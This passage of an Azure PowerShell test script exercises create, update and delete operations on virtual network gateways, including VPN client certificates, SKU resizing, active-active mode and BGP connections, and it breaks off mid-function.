














function Test-VirtualNetworkExpressRouteGatewayCRUD
{
 
    $rgname = Get-ResourceGroupName
    $rname = Get-ResourceName
    $domainNameLabel = Get-ResourceName
    $vnetName = Get-ResourceName
    $publicIpName = Get-ResourceName
    $vnetGatewayConfigName = Get-ResourceName
    $rglocation = Get-ProviderLocation ResourceManagement "West Central US"
    $resourceTypeParent = "Microsoft.Network/virtualNetworkGateways"
    $location = Get-ProviderLocation $resourceTypeParent "West Central US"
    
    try 
     {
      
      $resourceGroup = New-AzResourceGroup -Name $rgname -Location $rglocation -Tags @{ testtag = "testval" } 
      
	 
      
      $subnet = New-AzVirtualNetworkSubnetConfig -Name "GatewaySubnet" -AddressPrefix 10.0.0.0/24
      $vnet = New-AzVirtualNetwork -Name $vnetName -ResourceGroupName $rgname -Location $location -AddressPrefix 10.0.0.0/16 -Subnet $subnet
      $vnet = Get-AzVirtualNetwork -Name $vnetName -ResourceGroupName $rgname
      $subnet = Get-AzVirtualNetworkSubnetConfig -Name "GatewaySubnet" -VirtualNetwork $vnet

      
      $publicip = New-AzPublicIpAddress -ResourceGroupName $rgname -name $publicIpName -location $location -AllocationMethod Dynamic -DomainNameLabel $domainNameLabel    

      
      $vnetIpConfig = New-AzVirtualNetworkGatewayIpConfig -Name $vnetGatewayConfigName -PublicIpAddress $publicip -Subnet $subnet

      $actual = New-AzVirtualNetworkGateway -ResourceGroupName $rgname -name $rname -location $location -IpConfigurations $vnetIpConfig -GatewayType ExpressRoute -GatewaySku UltraPerformance -VpnType RouteBased -VpnGatewayGeneration None -Force 
      $expected = Get-AzVirtualNetworkGateway -ResourceGroupName $rgname -name $rname
      Assert-AreEqual $expected.ResourceGroupName $actual.ResourceGroupName	
      Assert-AreEqual $expected.Name $actual.Name	
      Assert-AreEqual "ExpressRoute" $expected.GatewayType
	  Assert-AreEqual "None" $expected.VpnGatewayGeneration
      
      
      $list = Get-AzVirtualNetworkGateway -ResourceGroupName $rgname
      Assert-AreEqual 1 @($list).Count
      Assert-AreEqual $list[0].ResourceGroupName $actual.ResourceGroupName	
      Assert-AreEqual $list[0].Name $actual.Name	
      Assert-AreEqual $list[0].Location $actual.Location

      $list = Get-AzVirtualNetworkGateway -ResourceGroupName $rgname -Name "*"
      Assert-True { $list.Count -ge 0 }
      
      
      $delete = Remove-AzVirtualNetworkGateway -ResourceGroupName $actual.ResourceGroupName -name $rname -PassThru -Force
      Assert-AreEqual true $delete
      
      $list = Get-AzVirtualNetworkGateway -ResourceGroupName $actual.ResourceGroupName
      Assert-AreEqual 0 @($list).Count

     }
     finally
     {
        
        Clean-ResourceGroup $rgname
     }
}


function Test-VirtualNetworkGatewayCRUD
{
    
    $rgname = Get-ResourceGroupName
    $rname = Get-ResourceName
    $domainNameLabel = Get-ResourceName
    $vnetName = Get-ResourceName
    $publicIpName = Get-ResourceName
    $vnetGatewayConfigName = Get-ResourceName
    $rglocation = Get-ProviderLocation ResourceManagement
    $resourceTypeParent = "Microsoft.Network/virtualNetworkGateways"
    $location = Get-ProviderLocation $resourceTypeParent
    
    try 
     {
      
      $resourceGroup = New-AzResourceGroup -Name $rgname -Location $rglocation -Tags @{ testtag = "testval" } 
      
      
      $subnet = New-AzVirtualNetworkSubnetConfig -Name "GatewaySubnet" -AddressPrefix 10.0.0.0/24
      $vnet = New-AzVirtualNetwork -Name $vnetName -ResourceGroupName $rgname -Location $location -AddressPrefix 10.0.0.0/16 -Subnet $subnet
      $vnet = Get-AzVirtualNetwork -Name $vnetName -ResourceGroupName $rgname
      $subnet = Get-AzVirtualNetworkSubnetConfig -Name "GatewaySubnet" -VirtualNetwork $vnet

      
      $publicip = New-AzPublicIpAddress -ResourceGroupName $rgname -name $publicIpName -location $location -AllocationMethod Dynamic -DomainNameLabel $domainNameLabel    

      
      $vnetIpConfig = New-AzVirtualNetworkGatewayIpConfig -Name $vnetGatewayConfigName -PublicIpAddress $publicip -Subnet $subnet
      $job = New-AzVirtualNetworkGateway -ResourceGroupName $rgname -name $rname -location $location -IpConfigurations $vnetIpConfig -GatewayType Vpn -VpnType RouteBased -EnableBgp $false -AsJob
	  $job | Wait-Job
	  $actual = $job | Receive-Job
      $expected = Get-AzVirtualNetworkGateway -ResourceGroupName $rgname -name $rname
      Assert-AreEqual $expected.ResourceGroupName $actual.ResourceGroupName	
      Assert-AreEqual $expected.Name $actual.Name	
      Assert-AreEqual "Vpn" $expected.GatewayType
      Assert-AreEqual "RouteBased" $expected.VpnType

	  
      $list = Get-AzVirtualNetworkGateway -ResourceGroupName $rgname
      Assert-AreEqual 1 @($list).Count
      Assert-AreEqual $list[0].ResourceGroupName $actual.ResourceGroupName	
      Assert-AreEqual $list[0].Name $actual.Name	
      Assert-AreEqual $list[0].Location $actual.Location
      
      
      $job = Reset-AzVirtualNetworkGateway -VirtualNetworkGateway $expected -AsJob
	  $job | Wait-Job
	  $actual = $job | Receive-Job
      $list = Get-AzVirtualNetworkGateway -ResourceGroupName $rgname
      Assert-AreEqual 1 @($list).Count

	  
	  $publicipAddress = Get-AzPublicIpAddress -Name $publicip.Name -ResourceGroupName $publicip.ResourceGroupName
	  $actual = Reset-AzVirtualNetworkGateway -VirtualNetworkGateway $expected -GatewayVip $publicipAddress.IpAddress
	  $list = Get-AzVirtualNetworkGateway -ResourceGroupName $rgname
      Assert-AreEqual 1 @($list).Count

      
      $job = Remove-AzVirtualNetworkGateway -ResourceGroupName $actual.ResourceGroupName -name $rname -PassThru -Force -AsJob
	  $job | Wait-Job
	  $delete = $job | Receive-Job
      Assert-AreEqual true $delete
      
      $list = Get-AzVirtualNetworkGateway -ResourceGroupName $actual.ResourceGroupName
      Assert-AreEqual 0 @($list).Count
     }
     finally
     {
        
        Clean-ResourceGroup $rgname
     }
}


function Test-VirtualNetworkGatewayGenerateVpnProfile
{
param 
    ( 
        $basedir = ".\" 
    )

    
    $rgname = Get-ResourceName
    $rname = Get-ResourceName
    $domainNameLabel = Get-ResourceName
    $vnetName = Get-ResourceName
    $publicIpName = Get-ResourceName
    $vnetGatewayConfigName = Get-ResourceName
    $rglocation = Get-ProviderLocation ResourceManagement
    $resourceTypeParent = "Microsoft.Network/virtualNetworkGateways"
    $location = Get-ProviderLocation $resourceTypeParent
	$vpnclientAuthMethod = "EAPTLS"
    
    try 
     {
      
      $resourceGroup = New-AzResourceGroup -Name $rgname -Location $rglocation -Tags @{ testtag = "testval" } 
      
      
      $subnet = New-AzVirtualNetworkSubnetConfig -Name "GatewaySubnet" -AddressPrefix 10.0.0.0/24
      $vnet = New-AzVirtualNetwork -Name $vnetName -ResourceGroupName $rgname -Location $location -AddressPrefix 10.0.0.0/16 -Subnet $subnet
      $vnet = Get-AzVirtualNetwork -Name $vnetName -ResourceGroupName $rgname
      $subnet = Get-AzVirtualNetworkSubnetConfig -Name "GatewaySubnet" -VirtualNetwork $vnet

      
      $publicip = New-AzPublicIpAddress -ResourceGroupName $rgname -name $publicIpName -location $location -AllocationMethod Dynamic -DomainNameLabel $domainNameLabel

      
      $samplePublicCertData = "MIIDUzCCAj+gAwIBAgIQRggGmrpGj4pCblTanQRNUjAJBgUrDgMCHQUAMDQxEjAQBgNVBAoTCU1pY3Jvc29mdDEeMBwGA1UEAxMVQnJrIExpdGUgVGVzdCBSb290IENBMB4XDTEzMDExOTAwMjQxOFoXDTIxMDExOTAwMjQxN1owNDESMBAGA1UEChMJTWljcm9zb2Z0MR4wHAYDVQQDExVCcmsgTGl0ZSBUZXN0IFJvb3QgQ0EwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC7SmE+iPULK0Rs7mQBO/6a6B6/G9BaMxHgDGzAmSG0Qsyt5e08aqgFnPdkMl3zRJw3lPKGha/JCvHRNrO8UpeAfc4IXWaqxx2iBipHjwmHPHh7+VB8lU0EJcUe7WBAI2n/sgfCwc+xKtuyRVlOhT6qw/nAi8e5don/iHPU6q7GCcnqoqtceQ/pJ8m66cvAnxwJlBFOTninhb2VjtvOfMQ07zPP+ZuYDPxvX5v3nd6yDa98yW4dZPuiGO2s6zJAfOPT2BrtyvLekItnSgAw3U5C0bOb+8XVKaDZQXbGEtOw6NZvD4L2yLd47nGkN2QXloiPLGyetrj3Z2pZYcrZBo8hAgMBAAGjaTBnMGUGA1UdAQReMFyAEOncRAPNcvJDoe4WP/gH2U+hNjA0MRIwEAYDVQQKEwlNaWNyb3NvZnQxHjAcBgNVBAMTFUJyayBMaXRlIFRlc3QgUm9vdCBDQYIQRggGmrpGj4pCblTanQRNUjAJBgUrDgMCHQUAA4IBAQCGyHhMdygS0g2tEUtRT4KFM+qqUY5HBpbIXNAav1a1dmXpHQCziuuxxzu3iq4XwnWUF1OabdDE2cpxNDOWxSsIxfEBf9ifaoz/O1ToJ0K757q2Rm2NWqQ7bNN8ArhvkNWa95S9gk9ZHZLUcjqanf0F8taJCYgzcbUSp+VBe9DcN89sJpYvfiBiAsMVqGPc/fHJgTScK+8QYrTRMubtFmXHbzBSO/KTAP5rBTxse88EGjK5F8wcedvge2Ksk6XjL3sZ19+Oj8KTQ72wihN900p1WQldHrrnbixSpmHBXbHr9U0NQigrJp5NphfuU5j81C8ixvfUdwyLmTv7rNA7GTAD";
      $clientRootCertName = "BrkLiteTestMSFTRootCA.cer"
      $rootCert = New-AzVpnClientRootCertificate -Name $clientRootCertName -PublicCertData $samplePublicCertData

      
      $vnetIpConfig = New-AzVirtualNetworkGatewayIpConfig -Name $vnetGatewayConfigName -PublicIpAddress $publicip -Subnet $subnet
      $actual = New-AzVirtualNetworkGateway -ResourceGroupName $rgname -name $rname -location $location -IpConfigurations $vnetIpConfig -GatewayType Vpn -VpnType RouteBased -EnableBgp $false -GatewaySku VpnGw2 -VpnClientAddressPool 201.169.0.0/16 -VpnClientRootCertificates $rootCert
      $expected = Get-AzVirtualNetworkGateway -ResourceGroupName $rgname -name $rname
      Assert-AreEqual $expected.ResourceGroupName $actual.ResourceGroupName	
      Assert-AreEqual $expected.Name $actual.Name	
      Assert-AreEqual "Vpn" $expected.GatewayType
      Assert-AreEqual "RouteBased" $expected.VpnType

        $radiusCertFilePath = $basedir + "\ScenarioTests\Data\ApplicationGatewayAuthCert.cer"
        $vpnProfilePackageUrl = New-AzVpnClientConfiguration -ResourceGroupName $rgname -name $rname -AuthenticationMethod $vpnclientAuthMethod -RadiusRootCertificateFile $radiusCertFilePath
        Assert-NotNull $vpnProfilePackageUrl
        Assert-NotNull $vpnProfilePackageUrl.VpnProfileSASUrl

        $vpnProfilePackageUrl = Get-AzVpnClientConfiguration -ResourceGroupName $rgname -name $rname
        Assert-NotNull $vpnProfilePackageUrl
        Assert-NotNull $vpnProfilePackageUrl.VpnProfileSASUrl
    }
     finally
     {
        
        Clean-ResourceGroup $rgname
     }
}


function Test-SetVirtualNetworkGatewayCRUD
{
    
    $rgname = Get-ResourceGroupName
    $rname = Get-ResourceName
    $domainNameLabel = Get-ResourceName
	$lngName = Get-ResourceName
	$connName = Get-ResourceName
    $vnetName = Get-ResourceName
    $publicIpName = Get-ResourceName
    $vnetGatewayConfigName = Get-ResourceName
    $rglocation = Get-ProviderLocation ResourceManagement
    $resourceTypeParent = "Microsoft.Network/virtualNetworkGateways"
    $location = Get-ProviderLocation $resourceTypeParent "East US"
    
    try 
    {
      
      $resourceGroup = New-AzResourceGroup -Name $rgname -Location $rglocation -Tags @{ testtag = "testval" } 
      
      
      $subnet = New-AzVirtualNetworkSubnetConfig -Name "GatewaySubnet" -AddressPrefix 10.0.0.0/24
      $vnet = New-AzVirtualNetwork -Name $vnetName -ResourceGroupName $rgname -Location $location -AddressPrefix 10.0.0.0/16 -Subnet $subnet
      $vnet = Get-AzVirtualNetwork -Name $vnetName -ResourceGroupName $rgname
      $subnet = Get-AzVirtualNetworkSubnetConfig -Name "GatewaySubnet" -VirtualNetwork $vnet

      
      $publicip = New-AzPublicIpAddress -ResourceGroupName $rgname -name $publicIpName -location $location -AllocationMethod Dynamic -DomainNameLabel $domainNameLabel    

      
      $vnetIpConfig = New-AzVirtualNetworkGatewayIpConfig -Name $vnetGatewayConfigName -PublicIpAddress $publicip -Subnet $subnet
      New-AzVirtualNetworkGateway -ResourceGroupName $rgname -name $rname -location $location -IpConfigurations $vnetIpConfig -GatewayType Vpn -VpnType RouteBased -EnableBgp $false -GatewaySku Standard
      $gateway = Get-AzVirtualNetworkGateway -ResourceGroupName $rgname -name $rname

	  
	  $lng = New-AzLocalNetworkGateway -ResourceGroupName $rgname -Name $lngName -Location $location -GatewayIpAddress "1.2.3.4" -AddressPrefix "172.16.1.0/24"
	  $job = Set-AzVirtualNetworkGateway -VirtualNetworkGateway $gateway -GatewayDefaultSite $lng -AsJob
	  $job | Wait-Job
	  $gateway = $job | Receive-Job
	  Assert-AreEqual $lng.Id $gateway.GatewayDefaultSite.Id 

	  
	  $vpnClientAddressSpace = "192.168.1.0/24"
	  $gateway = Set-AzVirtualNetworkGateway -VirtualNetworkGateway $gateway -VpnClientAddressPool $vpnClientAddressSpace
	  Assert-AreEqual $vpnClientAddressSpace $gateway.VpnClientConfiguration.VpnClientAddressPool.AddressPrefixes

	  
	  $asn = 1337
	  $peerweight = 5
	  $gateway = Set-AzVirtualNetworkGateway -VirtualNetworkGateway $gateway -Asn $asn -PeerWeight $peerweight
	  Assert-AreEqual $asn $gateway.BgpSettings.Asn 
	  Assert-AreEqual $peerWeight $gateway.BgpSettings.PeerWeight

	  
	  $gateway = Set-AzVirtualNetworkGateway -VirtualNetworkGateway $gateway -Tag @{ testtagKey="SomeTagKey"; testtagValue="SomeKeyValue" }
	  Assert-AreEqual 2 $gateway.Tag.Count
	  Assert-AreEqual $true $gateway.Tag.Contains("testtagKey")
	}
    finally
    {
      
      Clean-ResourceGroup $rgname
    }
}


function Test-VirtualNetworkGatewayP2SAndSKU
{
    
    $rgname = Get-ResourceGroupName
    $rname = Get-ResourceName
    $domainNameLabel = Get-ResourceName
    $vnetName = Get-ResourceName
    $publicIpName = Get-ResourceName
    $vnetGatewayConfigName = Get-ResourceName
    $rglocation = Get-ProviderLocation ResourceManagement
    $resourceTypeParent = "Microsoft.Network/virtualNetworkGateways"
    $location = Get-ProviderLocation $resourceTypeParent
    
    try 
     {
      
      $resourceGroup = New-AzResourceGroup -Name $rgname -Location $rglocation -Tags @{ testtag = "testval" }
      
      
      $actual = New-AzLocalNetworkGateway -ResourceGroupName $rgname -name $rname -location $location -AddressPrefix 192.168.0.0/16 -GatewayIpAddress 192.168.4.5
      $localnetGateway = Get-AzLocalNetworkGateway -ResourceGroupName $rgname -name $rname
      Assert-AreEqual $localnetGateway.ResourceGroupName $actual.ResourceGroupName	
      Assert-AreEqual $localnetGateway.Name $actual.Name	
      Assert-AreEqual "192.168.4.5" $localnetGateway.GatewayIpAddress
      Assert-AreEqual "192.168.0.0/16" $localnetGateway.LocalNetworkAddressSpace.AddressPrefixes[0]

      
      $subnet = New-AzVirtualNetworkSubnetConfig -Name "GatewaySubnet" -AddressPrefix 10.0.0.0/24
      $vnet = New-AzVirtualNetwork -Name $vnetName -ResourceGroupName $rgname -Location $location -AddressPrefix 10.0.0.0/16 -Subnet $subnet
      $vnet = Get-AzVirtualNetwork -Name $vnetName -ResourceGroupName $rgname
      $subnet = Get-AzVirtualNetworkSubnetConfig -Name "GatewaySubnet" -VirtualNetwork $vnet

      
      $publicip = New-AzPublicIpAddress -ResourceGroupName $rgname -name $publicIpName -location $location -AllocationMethod Dynamic -DomainNameLabel $domainNameLabel

      $clientRootCertName = "BrkLiteTestMSFTRootCA.cer"
      
      $samplePublicCertData = "MIIDUzCCAj+gAwIBAgIQRggGmrpGj4pCblTanQRNUjAJBgUrDgMCHQUAMDQxEjAQBgNVBAoTCU1pY3Jvc29mdDEeMBwGA1UEAxMVQnJrIExpdGUgVGVzdCBSb290IENBMB4XDTEzMDExOTAwMjQxOFoXDTIxMDExOTAwMjQxN1owNDESMBAGA1UEChMJTWljcm9zb2Z0MR4wHAYDVQQDExVCcmsgTGl0ZSBUZXN0IFJvb3QgQ0EwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC7SmE+iPULK0Rs7mQBO/6a6B6/G9BaMxHgDGzAmSG0Qsyt5e08aqgFnPdkMl3zRJw3lPKGha/JCvHRNrO8UpeAfc4IXWaqxx2iBipHjwmHPHh7+VB8lU0EJcUe7WBAI2n/sgfCwc+xKtuyRVlOhT6qw/nAi8e5don/iHPU6q7GCcnqoqtceQ/pJ8m66cvAnxwJlBFOTninhb2VjtvOfMQ07zPP+ZuYDPxvX5v3nd6yDa98yW4dZPuiGO2s6zJAfOPT2BrtyvLekItnSgAw3U5C0bOb+8XVKaDZQXbGEtOw6NZvD4L2yLd47nGkN2QXloiPLGyetrj3Z2pZYcrZBo8hAgMBAAGjaTBnMGUGA1UdAQReMFyAEOncRAPNcvJDoe4WP/gH2U+hNjA0MRIwEAYDVQQKEwlNaWNyb3NvZnQxHjAcBgNVBAMTFUJyayBMaXRlIFRlc3QgUm9vdCBDQYIQRggGmrpGj4pCblTanQRNUjAJBgUrDgMCHQUAA4IBAQCGyHhMdygS0g2tEUtRT4KFM+qqUY5HBpbIXNAav1a1dmXpHQCziuuxxzu3iq4XwnWUF1OabdDE2cpxNDOWxSsIxfEBf9ifaoz/O1ToJ0K757q2Rm2NWqQ7bNN8ArhvkNWa95S9gk9ZHZLUcjqanf0F8taJCYgzcbUSp+VBe9DcN89sJpYvfiBiAsMVqGPc/fHJgTScK+8QYrTRMubtFmXHbzBSO/KTAP5rBTxse88EGjK5F8wcedvge2Ksk6XjL3sZ19+Oj8KTQ72wihN900p1WQldHrrnbixSpmHBXbHr9U0NQigrJp5NphfuU5j81C8ixvfUdwyLmTv7rNA7GTAD";
      $sampleClientCertName = "sampleClientCert.cer"
      $sampleClinentCertThumbprint = "5405D9A8AB2A303D4E772C444BC88C3B97F55F78"

      
      $vnetIpConfig = New-AzVirtualNetworkGatewayIpConfig -Name $vnetGatewayConfigName -PublicIpAddress $publicip -Subnet $subnet
      $rootCert = New-AzVpnClientRootCertificate -Name $clientRootCertName -PublicCertData $samplePublicCertData
      $clientCert = New-AzVpnClientRevokedCertificate -Name $sampleClientCertName -Thumbprint $sampleClinentCertThumbprint
      
      $actual = New-AzVirtualNetworkGateway -GatewayDefaultSite $localnetGateway -ResourceGroupName $rgname -Name $rname -Location $location -IpConfigurations $vnetIpConfig -GatewayType Vpn -VpnType RouteBased -EnableBgp $false -GatewaySku VpnGw1 -VpnClientAddressPool "201.169.0.0/16" -VpnClientProtocol SSTP -VpnClientRootCertificates $rootCert -VpnClientRevokedCertificates $clientCert
      $expected = Get-AzVirtualNetworkGateway -ResourceGroupName $rgname -name $rname
      Assert-AreEqual $expected.ResourceGroupName $actual.ResourceGroupName	
      Assert-AreEqual $expected.Name $actual.Name	
      Assert-AreEqual "Vpn" $expected.GatewayType
      Assert-AreEqual "RouteBased" $expected.VpnType
      Assert-AreEqual "VpnGw1" $expected.Sku.Tier
      Assert-AreEqual $localnetGateway.Id $expected.GatewayDefaultSite.Id
      Assert-AreEqual "201.169.0.0/16" $expected.VpnClientConfiguration.VpnClientAddressPool.AddressPrefixes[0]
      Assert-AreEqual $sampleClientCertName $expected.VpnClientConfiguration.VpnClientRevokedCertificates[0].name
      Assert-AreEqual $clientRootCertName $expected.VpnClientConfiguration.VpnClientRootCertificates[0].name

      
      $actual = Remove-AzVirtualNetworkGatewayDefaultSite -VirtualNetworkGateway $expected
	  $expected = Get-AzVirtualNetworkGateway -ResourceGroupName $rgname -name $rname
      Assert-Null $expected.GatewayDefaultSite

      
      Set-AzVirtualNetworkGatewayDefaultSite -VirtualNetworkGateway $expected -GatewayDefaultSite $localnetGateway
      $expected = Get-AzVirtualNetworkGateway -ResourceGroupName $rgname -name $rname
      Assert-AreEqual $localnetGateway.Id $expected.GatewayDefaultSite.Id

	  
	  $actual = Resize-AzVirtualNetworkGateway -VirtualNetworkGateway $expected -GatewaySku VpnGw2
      Assert-AreEqual "Succeeded" $actual.ProvisioningState
	  $expected = Get-AzVirtualNetworkGateway -ResourceGroupName $rgname -name $rname	  
      Assert-AreEqual "VpnGw2" $expected.Sku.Tier

     
     $rootCert = Get-AzVpnClientRootCertificate -VpnClientRootCertificateName $clientRootCertName -VirtualNetworkGatewayName $expected.Name -ResourceGroupName $expected.ResourceGroupName
     Assert-AreEqual $clientRootCertName $rootCert.Name

     $rootCerts = Get-AzVpnClientRootCertificate -VirtualNetworkGatewayName $expected.Name -ResourceGroupName $expected.ResourceGroupName
     Assert-AreEqual 1 @($rootCerts).Count
     
     
     $packageUrl = Get-AzVpnClientPackage -ResourceGroupName $expected.ResourceGroupName -VirtualNetworkGatewayName $expected.Name -ProcessorArchitecture Amd64
	 

     
     $delete = Remove-AzVpnClientRootCertificate -VpnClientRootCertificateName $clientRootCertName -VirtualNetworkGatewayName $expected.Name -ResourceGroupName $expected.ResourceGroupName -PublicCertData $samplePublicCertData
	 Assert-AreEqual True $delete
     $rootCerts = Get-AzVpnClientRootCertificate -VirtualNetworkGatewayName $expected.Name -ResourceGroupName $expected.ResourceGroupName
     Assert-AreEqual 0 @($rootCerts).Count
     
     
     $rootCerts = Add-AzVpnClientRootCertificate -VpnClientRootCertificateName $clientRootCertName -VirtualNetworkGatewayName $expected.Name -ResourceGroupName $expected.ResourceGroupName -PublicCertData $samplePublicCertData
	 Assert-AreEqual 1 @($rootCerts).Count

     
     $revokedCerts = Get-AzVpnClientRevokedCertificate -VirtualNetworkGatewayName $expected.Name -ResourceGroupName $expected.ResourceGroupName
     Assert-AreEqual 1 @($revokedCerts).Count

     
     $delete = Remove-AzVpnClientRevokedCertificate -VpnClientRevokedCertificateName $sampleClientCertName -VirtualNetworkGatewayName $expected.Name -ResourceGroupName $expected.ResourceGroupName -Thumbprint $sampleClinentCertThumbprint
	 Assert-AreEqual True $delete
     $revokedCerts = Get-AzVpnClientRevokedCertificate -VirtualNetworkGatewayName $expected.Name -ResourceGroupName $expected.ResourceGroupName
     Assert-AreEqual 0 @($revokedCerts).Count

     
     $revokedCerts = Add-AzVpnClientRevokedCertificate -VpnClientRevokedCertificateName $sampleClientCertName -VirtualNetworkGatewayName $expected.Name -ResourceGroupName $expected.ResourceGroupName -Thumbprint $sampleClinentCertThumbprint
	 Assert-AreEqual 1 @($revokedCerts).Count
     $revokedCert = Get-AzVpnClientRevokedCertificate -VpnClientRevokedCertificateName $sampleClientCertName -VirtualNetworkGatewayName $expected.Name -ResourceGroupName $expected.ResourceGroupName
     Assert-AreEqual $sampleClientCertName $revokedCert.Name               
     }
     finally
     {
        
        Clean-ResourceGroup $rgname
     }
}


function Test-VirtualNetworkGatewayActiveActiveFeatureOperations
{
    
    $rgname = Get-ResourceGroupName
    $rname = Get-ResourceName
    $domainNameLabel1 = Get-ResourceName
    $domainNameLabel2 = Get-ResourceName
    $vnetName = Get-ResourceName
    $publicIpName1 = Get-ResourceName
    $publicIpName2 = Get-ResourceName
    $vnetGatewayConfigName1 = Get-ResourceName
    $vnetGatewayConfigName2 = Get-ResourceName
    $rglocation = Get-ProviderLocation ResourceManagement
    $resourceTypeParent = "Microsoft.Network/virtualNetworkGateways"
    $location = Get-ProviderLocation $resourceTypeParent
    
    try 
     {
      
      $resourceGroup = New-AzResourceGroup -Name $rgname -Location $rglocation -Tags @{ testtag = "testval" } 
      
      
      $subnet = New-AzVirtualNetworkSubnetConfig -Name "GatewaySubnet" -AddressPrefix 10.0.0.0/24
      $vnet = New-AzVirtualNetwork -Name $vnetName -ResourceGroupName $rgname -Location $location -AddressPrefix 10.0.0.0/16 -Subnet $subnet
      $vnet = Get-AzVirtualNetwork -Name $vnetName -ResourceGroupName $rgname
      $subnet = Get-AzVirtualNetworkSubnetConfig -Name "GatewaySubnet" -VirtualNetwork $vnet

      
      $publicip1 = New-AzPublicIpAddress -ResourceGroupName $rgname -name $publicIpName1 -location $location -AllocationMethod Dynamic -DomainNameLabel $domainNameLabel1   
      $vnetIpConfig1 = New-AzVirtualNetworkGatewayIpConfig -Name $vnetGatewayConfigName1 -PublicIpAddress $publicip1 -Subnet $subnet

      $publicip2 = New-AzPublicIpAddress -ResourceGroupName $rgname -name $publicIpName2 -location $location -AllocationMethod Dynamic -DomainNameLabel $domainNameLabel2
      $vnetIpConfig2 = New-AzVirtualNetworkGatewayIpConfig -Name $vnetGatewayConfigName2 -PublicIpAddress $publicip2 -Subnet $subnet

      $actual = New-AzVirtualNetworkGateway -ResourceGroupName $rgname -name $rname -Location $location -IpConfigurations $vnetIpConfig1,$vnetIpConfig2 -GatewayType Vpn -VpnType RouteBased -EnableBgp $false -GatewaySku VpnGw1 -EnableActiveActiveFeature
      $expected = Get-AzVirtualNetworkGateway -ResourceGroupName $rgname -name $rname
      Assert-AreEqual $expected.ResourceGroupName $actual.ResourceGroupName	
      Assert-AreEqual $expected.Name $actual.Name	
      Assert-AreEqual "Vpn" $expected.GatewayType
      Assert-AreEqual "RouteBased" $expected.VpnType
      Assert-AreEqual true $expected.ActiveActive
      Assert-AreEqual 2 @($expected.IpConfigurations).Count

      
      $gw = Get-AzVirtualNetworkGateway -Name $rname -ResourceGroupName $rgname
      Remove-AzVirtualNetworkGatewayIpConfig -Name $vnetGatewayConfigName2 -VirtualNetworkGateway $gw 
      $expected = Set-AzVirtualNetworkGateway -VirtualNetworkGateway $gw -GatewaySku VpnGw2 -DisableActiveActiveFeature
      $expected = Get-AzVirtualNetworkGateway -ResourceGroupName $rgname -name $rname
      Assert-AreEqual false $expected.ActiveActive
      Assert-AreEqual 1 @($expected.IpConfigurations).Count

      
      $gw = Get-AzVirtualNetworkGateway -Name $rname -ResourceGroupName $rgname
      Add-AzVirtualNetworkGatewayIpConfig -Name $vnetGatewayConfigName2 -VirtualNetworkGateway $gw -PublicIpAddress $publicip2 -Subnet $subnet
      $expected = Set-AzVirtualNetworkGateway -VirtualNetworkGateway $gw -GatewaySku VpnGw3 -EnableActiveActiveFeature
      $expected = Get-AzVirtualNetworkGateway -ResourceGroupName $rgname -name $rname
      Assert-AreEqual true $expected.ActiveActive
      Assert-AreEqual 2 @($expected.IpConfigurations).Count
     }
     finally
     {
        
        Clean-ResourceGroup $rgname
     }
}


function Test-VirtualNetworkGatewayBgpRouteApi
{
	
	$rgname = Get-ResourceGroupName
	$gwname = Get-ResourceName
	$domainNameLabel = Get-ResourceName
	$vnetName = Get-ResourceName
	$publicIpName = Get-ResourceName
	$vnetGatewayConfigName = Get-ResourceName
	$rgLocation = Get-ProviderLocation ResourceManagement
	$resourceTypeParent = "Microsoft.Network/virtualNetworkGateways"
	$location = Get-ProviderLocation $resourceTypeParent

	$gwname1 = Get-ResourceName
	$vnetName1 = Get-ResourceName
	$publicIpName1 = Get-ResourceName
	$domainNameLabel1 = Get-ResourceName
	$vnetGatewayConfigName1 = Get-ResourceName

	$connectionName = Get-ResourceName
	$connectionName1 = Get-ResourceName

	try 
	{
		$resourceGroup = New-AzResourceGroup -Name $rgname -Location $rglocation
		$subnet = New-AzVirtualNetworkSubnetConfig -Name "GatewaySubnet" -AddressPrefix 10.0.0.0/24
		$vnet = New-AzVirtualNetwork -Name $vnetName -ResourceGroupName $rgname -Location $location -AddressPrefix 10.0.0.0/16 -Subnet $subnet
		$vnet = Get-AzVirtualNetwork -Name $vnetName -ResourceGroupName $rgname
		$subnet = Get-AzVirtualNetworkSubnetConfig -Name "GatewaySubnet" -VirtualNetwork $vnet
		$publicip = New-AzPublicIpAddress -ResourceGroupName $rgname -name $publicIpName -location $location -AllocationMethod Dynamic -DomainNameLabel $domainNameLabel
		$vnetIpConfig = New-AzVirtualNetworkGatewayIpConfig -Name $vnetGatewayConfigName -PublicIpAddress $publicip -Subnet $subnet
		$gw = New-AzVirtualNetworkGateway -ResourceGroupName $rgname -name $gwname -location $location -IpConfigurations $vnetIpConfig -GatewayType Vpn -VpnType RouteBased -GatewaySku Standard
		$gw = Get-AzVirtualNetworkGateway -ResourceGroupName $rgname -name $gwname

		$subnet1 = New-AzVirtualNetworkSubnetConfig -Name "GatewaySubnet" -AddressPrefix 10.1.0.0/24
		$vnet1 = New-AzVirtualNetwork -Name $vnetName1 -ResourceGroupName $rgname -Location $location -AddressPrefix 10.1.0.0/16  -Subnet $subnet1
		$vnet1 = Get-AzVirtualNetwork -Name $vnetName1 -ResourceGroupName $rgname
		$subnet1 = Get-AzVirtualNetworkSubnetConfig -Name "GatewaySubnet" -VirtualNetwork $vnet1
		$publicip1 = New-AzPublicIpAddress -Name $publicIpName1 -ResourceGroupName $rgname -location $location -AllocationMethod Dynamic -DomainNameLabel $domainNameLabel1
		$vnetIpConfig1 = New-AzVirtualNetworkGatewayIpConfig -Name $vnetGatewayConfigName1 -PublicIpAddress $publicip1 -Subnet $subnet1
		$gw1 = New-AzVirtualNetworkGateway -ResourceGroupName $rgname -name $gwname1 -location $location -IpConfigurations $vnetIpConfig1 -GatewayType Vpn -VpnType RouteBased -GatewaySku Standard -Asn 1337
		$gw1 = Get-AzVirtualNetworkGateway -ResourceGroupName $rgname -name $gwname1

		New-AzVirtualNetworkGatewayConnection -ResourceGroupName $rgname -name $connectionName -location $location -VirtualNetworkGateway1 $gw -VirtualNetworkGateway2 $gw1 -ConnectionType Vnet2Vnet -SharedKey chocolate -EnableBgp $true
		New-AzVirtualNetworkGatewayConnection -ResourceGroupName $rgname -name $connectionName1 -location $location -VirtualNetworkGateway1 $gw1 -VirtualNetworkGateway2 $gw -ConnectionType Vnet2Vnet -SharedKey chocolate -EnableBgp $true

		$job = Get-AzVirtualNetworkGatewayBGPPeerStatus -ResourceGroupName $rgname -VirtualNetworkGatewayName $gwname -AsJob
		$job | Wait-Job
